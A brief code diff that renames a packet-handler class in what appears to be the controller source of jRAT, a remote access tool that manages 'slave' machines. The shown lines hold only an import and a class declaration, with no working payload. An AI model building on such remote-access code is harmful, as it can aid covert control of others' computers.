@@ -5,7 +5,7 @@ import java.io.DataInputStream;
 import se.jrat.client.Slave;
 
 
-public class Packet31InitInstallationDate extends AbstractIncomingPacket {
+public class Packet11InitInstallationDate extends AbstractIncomingPacket {
 
 	@Override
 	public void read(Slave slave, DataInputStream dis) throws Exception {
